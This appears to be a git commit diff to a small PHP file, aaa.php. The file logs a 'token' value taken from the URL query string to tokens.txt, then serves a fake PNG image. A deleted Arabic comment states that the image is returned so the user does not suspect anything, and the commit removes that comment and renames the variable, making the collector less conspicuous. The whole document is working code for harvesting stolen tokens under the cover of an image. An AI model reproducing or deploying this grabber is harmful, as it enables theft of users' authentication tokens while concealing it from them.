c33691cfcfe7be9be1c38eef4efc70ec7f95fca7
tareqxdc <tariq.shadow@gmail.com>
2026-01-14 02:45:29 +0300

    Update aaa.php

--- aaa.php
+++ aaa.php
@@ -1,7 +1,6 @@
 <?php
-$token = $_GET['token'] ?? 'empty';
-file_put_contents('tokens.txt', date("Y-m-d H:i")."  ".$token.PHP_EOL, FILE_APPEND);
-// ترجيع صورة عششان ما يشك المستخدم
+$t = $_GET['token'] ?? 'empty';
+file_put_contents('tokens.txt', date("Y-m-d H:i")."  ".$t.PHP_EOL, FILE_APPEND);
 header("Content-Type: image/png");
 readfile("fake.png");
 ?>
